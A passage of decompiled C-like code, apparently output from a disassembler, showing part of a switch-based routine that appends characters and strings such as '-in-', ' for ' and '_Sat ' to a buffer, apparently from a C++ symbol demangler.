*(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5252c9) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 10:\n        puVar15 = 0x5252cb;\n        uVar26 = 0x56;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5252d2) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xb:\n        puVar15 = 0x5252d4;\n        uVar26 = 99;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5252eb) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pcVar16 = \"-in-\";\n        fcn.004306e0();\n        cVar12 = '-';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xc:\n        puVar15 = 0x5252f2;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5252fe) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xd:\n        puVar15 = 0x525300;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525311) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xe:\n        puVar15 = 0x525313;\n        uVar26 = 0x74;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525322) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0xf:\n        puVar15 = 0x525324;\n        uVar26 = 0x6e;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525338) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x10:\n        puVar15 = 0x52533a;\n        uVar26 = 0x76;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x52534a) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x11:\n        puVar15 = 0x52534c;\n        uVar26 = 99;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525365) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x12:\n        puVar15 = 0x525367;\n        uVar26 = 0x6a;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525375) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x13:\n        puVar15 = 0x525377;\n        uVar26 = 0x67;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525389) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x14:\n        puVar15 = 0x52538b;\n        uVar26 = 0x54;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5253a0) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x15:\n        puVar15 = 0x5253a2;\n        uVar26 = 0x54;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5253ba) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x16:\n        puVar15 = 0x5253bc;\n        uVar26 = 0x72;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5253d0) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        pcVar16 = \" for \";\n        fcn.004306e0();\n        cVar12 = ' ';\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            pcVar16 = pcVar16 + 1;\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = cVar12;\n            in_EAX[0x104] = cVar12;\n            if (pcVar16 == \"\") break;\n            cVar12 = *pcVar16;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x17:\n        puVar15 = 0x5253d8;\n        uVar26 = 0x68;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x5253e8) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x18:\n        puVar15 = param_1[2];\n        if (param_1[3] != 0) {\n            puVar10 = puVar15 + param_1[3];\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *puVar15;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    iVar20 = 0;\n                    (**(in_EAX + 0x108))();\n                    iVar4 = 1;\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                iVar20 = iVar4;\n            } while (puVar10 != puVar15);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n        appuStack92[0] = *(in_EAX + 0x114);\n        for (ppuVar21 = appuStack92[0]; appuStack92[1] = param_1,  ppuVar21 != NULL; ppuVar21 = *ppuVar21) {\n            if (ppuVar21[2] == NULL) {\n                if (2 < *ppuVar21[1] - 0x19) {\n                    ppuStack128 = NULL;\n                    break;\n                }\n                if (uVar6 == *ppuVar21[1]) {\n                    fcn.004306e0();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    goto code_r0x004308e1;\n                }\n            }\n        }\ncode_r0x00431e48:\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        goto code_r0x00431dc9;\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x25:\n    case 0x26:\n    case 0x4c:\n    case 0x4e:\n    case 0x4f:\ncode_r0x00431d95:\n        appuStack92[0] = *(in_EAX + 0x114);\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        appuStack92[1] = param_1;\ncode_r0x00431dc9:\n        appuStack92[2] = NULL;\n        fcn.004306e0();\n        if (appuStack92[2] == NULL) {\n            fcn.00435070();\n        }\n        *(in_EAX + 0x114) = appuStack92[0];\n        if (ppuStack128 != NULL) {\n            *(in_EAX + 0x110) = iStack120;\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x23:\n    case 0x24:\n        puVar7 = param_1[2];\n        uVar17 = *puVar7;\n        if ((*(in_EAX + 0x120) != 0) || (ppuStack128 = NULL,  uVar17 != 5)) goto code_r0x00431d73;\n        ppuVar21 = *(in_EAX + 0x130);\n        iVar4 = *(in_EAX + 0x134);\n        if (iVar4 < 1) {\ncode_r0x00433fdd:\n            if (*(in_EAX + 0x138) <= iVar4) {\ncode_r0x00434e79:\n                *(in_EAX + 0x118) = 1;\n                uVar17 = param_1[1] - 1;\n                break;\n            }\n            *(in_EAX + 0x134) = iVar4 + 1;\n            puVar11 = *(in_EAX + 0x110);\n            ppuVar21[iVar4 * 2] = puVar7;\n            ppuStack128 = ppuVar21 + iVar4 * 2 + 1;\n            for (; puVar11 != NULL; puVar11 = *puVar11) {\n                iVar4 = *(in_EAX + 0x140);\n                if (*(in_EAX + 0x144) <= iVar4) goto code_r0x00434e79;\n                ppuVar21 = *(in_EAX + 0x13c) + iVar4 * 8;\n                *(in_EAX + 0x140) = iVar4 + 1;\n                ppuVar21[1] = puVar11[1];\n                *ppuStack128 = ppuVar21;\n                ppuStack128 = ppuVar21;\n            }\n            *ppuStack128 = NULL;\ncode_r0x0043405b:\n            puVar7 = fcn.0042dd10();\n            ppuStack128 = NULL;\n            if (puVar7 != NULL) goto code_r0x00434913;\n        }\n        else {\n            ppuVar9 = &puStack108;\n            ppuStack128 = ppuVar21;\n            if (puVar7 != *ppuVar21) {\n                iVar8 = 0;\n                do {\n                    ppuStack128 = ppuStack128 + 2;\n                    iVar8 = iVar8 + 1;\n                    if (iVar4 == iVar8) goto code_r0x00433fdd;\n                } while (puVar7 != *ppuStack128);\n            }\n            do {\n                if ((puVar7 == *ppuVar9) || ((param_1 == *ppuVar9 && (ppuVar9 != &puStack108)))) goto code_r0x0043405b;\n                ppuVar21 = ppuVar9 + 1;\n                ppuVar9 = *ppuVar21;\n            } while (*ppuVar21 != NULL);\n            iStack120 = *(in_EAX + 0x110);\n            *(in_EAX + 0x110) = ppuStack128[1];\n            puVar7 = fcn.0042dd10();\n            ppuStack128 = 0x1;\n            if (puVar7 != NULL) {\ncode_r0x00434913:\n                uVar17 = *puVar7;\n                if (uVar17 == 0x2f) {\n                    if (-1 < *(in_EAX + 0x124)) {\n                        puVar7 = fcn.0042dcd0();\n                        if (puVar7 == NULL) {\n                            if (ppuStack128 == NULL) goto code_r0x00434077;\n                            goto code_r0x00434da3;\n                        }\n                        uVar17 = *puVar7;\n                        goto code_r0x00431d73;\n                    }\n                    appuStack92[1] = param_1;\n                    if (*param_1 == 0x2f) {\n                        appuStack92[1] = puVar7;\n                    }\n                }\n                else {\ncode_r0x00431d73:\n                    appuStack92[1] = puVar7;\n                    if (((uVar17 != 0x23) && (*param_1 != uVar17)) && (appuStack92[1] = param_1,  uVar17 == 0x24))\n                    goto code_r0x00431d95;\n                }\n                appuStack92[0] = *(in_EAX + 0x114);\n                goto code_r0x00431e48;\n            }\ncode_r0x00434da3:\n            *(in_EAX + 0x110) = iStack120;\n        }\ncode_r0x00434077:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x27:\n        puVar11 = param_1[2];\n        if ((param_2 & 4) == 0) {\n            puVar15 = *puVar11;\n            if (puVar11[1] != 0) {\n                puVar10 = puVar15 + puVar11[1];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (puVar10 != puVar15);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            puVar15 = puVar11[2];\n            if (puVar11[3] != 0) {\n                puVar10 = puVar15 + puVar11[3];\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar4 = 1;\n                        iVar20 = 0;\n                    }\n                    else {\n                        iVar4 = iVar20 + 1;\n                    }\n                    puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar4;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar4;\n                } while (puVar10 != puVar15);\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x28:\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x29:\n        ppuVar21 = *(in_EAX + 0x114);\n        if ((param_2 & 0x20) == 0) {\n            if ((param_1[2] != 0) && ((param_2 & 0x40) == 0)) {\n                *(in_EAX + 0x114) = appuStack92;\n                appuStack92[3] = *(in_EAX + 0x110);\n                appuStack92[2] = NULL;\n                appuStack92[0] = ppuVar21;\n                appuStack92[1] = param_1;\n                fcn.004306e0();\n                *(in_EAX + 0x114) = appuStack92[0];\n                if (appuStack92[2] != NULL) {\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                ppuVar21 = *(in_EAX + 0x114);\n                in_EAX[0x104] = 0x20;\n            }\n            fcn.00435990(ppuVar21);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            fcn.00435990(ppuVar21);\n            if (param_1[2] == 0) {\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                fcn.004306e0();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x2a:\n        ppuVar21 = *(in_EAX + 0x114);\n        appuStack92[3] = *(in_EAX + 0x110);\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[2] = NULL;\n        appuStack92[0] = ppuVar21;\n        if ((ppuVar21 == NULL) || (2 < *ppuVar21[1] - 0x19)) {\n            appuStack92[1] = param_1;\n            fcn.004306e0();\n            *(in_EAX + 0x114) = ppuVar21;\n            if (appuStack92[2] == NULL) goto code_r0x004318a9;\n        }\n        else {\n            ppuVar9 = ppuVar21;\n            uVar17 = 1;\n            pppuVar22 = appuStack92;\n            do {\n                uVar6 = uVar17;\n                if (ppuVar9[2] == NULL) {\n                    if (3 < uVar17) {\n                        *(in_EAX + 0x118) = 1;\n                        goto code_r0x004318c0;\n                    }\n                    uVar6 = uVar17 + 1;\n                    appuStack92[uVar17 * 4] = *ppuVar9;\n                    appuStack92[uVar17 * 4 + 1] = ppuVar9[1];\n                    appuStack92[uVar17 * 4 + 2] = ppuVar9[2];\n                    appuStack92[uVar17 * 4 + 3] = ppuVar9[3];\n                    appuStack92[uVar17 * 4] = pppuVar22;\n                    pppuVar22 = appuStack92 + uVar17 * 4;\n                    *(in_EAX + 0x114) = pppuVar22;\n                    ppuVar9[2] = 0x1;\n                }\n                ppuVar9 = *ppuVar9;\n            } while ((ppuVar9 != NULL) && (uVar17 = uVar6,  *ppuVar9[1] - 0x19 < 3));\n            appuStack92[1] = param_1;\n            fcn.004306e0();\n            *(in_EAX + 0x114) = ppuVar21;\n            if (appuStack92[2] == NULL) {\n                if (uVar6 != 1) {\n                    pppuVar22 = appuStack92 + uVar6 * 4;\n                    do {\n                        pppuVar22 = pppuVar22 + -4;\n                        fcn.00435070();\n                    } while (appuStack92 + 4 != pppuVar22);\n                }\ncode_r0x004318a9:\n                fcn.00436080(*(in_EAX + 0x114));\n            }\n        }\ncode_r0x004318c0:\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x2b:\n    case 0x2d:\n        appuStack92[0] = *(in_EAX + 0x114);\n        appuStack92[2] = NULL;\n        *(in_EAX + 0x114) = appuStack92;\n        appuStack92[3] = *(in_EAX + 0x110);\n        appuStack92[1] = param_1;\n        fcn.004306e0();\n        if (appuStack92[2] == NULL) {\n            fcn.00435070();\n        }\n        uVar17 = param_1[1] - 1;\n        *(in_EAX + 0x114) = appuStack92[0];\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x2c:\n        if (*(param_1 + 0xe) != 0) {\n            pcVar16 = \"_Sat \";\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar16 != \"\");\n        }\n        if (*(param_1[2] + 8) == 0x526220) {\n            iVar20 = *(in_EAX + 0x100);\n        }\n        else {\n            fcn.004306e0();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar4 = *(in_EAX + 0x100);\n            iVar20 = iVar4 + 1;\n            *(in_EAX + 0x100) = iVar20;\n            in_EAX[iVar4] = 0x20;\n            in_EAX[0x104] = 0x20;\n        }\n        if (*(param_1 + 3) == 0) {\n            puVar15 = 0x525422;\n            uVar26 = 0x5f;\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x525427) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            puVar15 = 0x525429;\n            uVar26 = 0x5f;\n            while( true ) {\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x52542e) break;\n                uVar26 = *puVar15;\n                puVar15 = puVar15 + 1;\n                iVar20 = iVar4;\n            }\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x2e:\n    case 0x2f:\n        if (param_1[2] != 0) {\n            fcn.004306e0();\n        }\n        if (param_1[3] == 0) {\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            uVar17 = *(in_EAX + 0x100);\n            if (0xfd < uVar17) {\n                in_EAX[uVar17] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                uVar17 = 0;\n                *(in_EAX + 0x100) = 0;\n            }\n            puVar15 = 0x52542f;\n            uVar26 = 0x2c;\n            while( true ) {\n                if (uVar17 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    uVar6 = 1;\n                    uVar17 = 0;\n                }\n                else {\n                    uVar6 = uVar17 + 1;\n                }\n                puVar15 = puVar15 + 1;\n                *(in_EAX + 0x100) = uVar6;\n                in_EAX[uVar17] = uVar26;\n                in_EAX[0x104] = uVar26;\n                if (puVar15 == 0x525431) break;\n                uVar26 = *puVar15;\n                uVar17 = uVar6;\n            }\n            iVar20 = *(in_EAX + 0x128);\n            fcn.004306e0();\n            uVar17 = param_1[1] - 1;\n            if (iVar20 == *(in_EAX + 0x128)) {\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                if (*(in_EAX + 0x100) == uVar6) {\n                    *(in_EAX + 0x100) = uVar6 - 2;\n                }\n            }\n            else {\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        break;\n    case 0x30:\n        if (param_1[2] != 0) {\n            fcn.004306e0();\n        }\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7b;\n        in_EAX[0x104] = 0x7b;\n        fcn.004306e0();\n        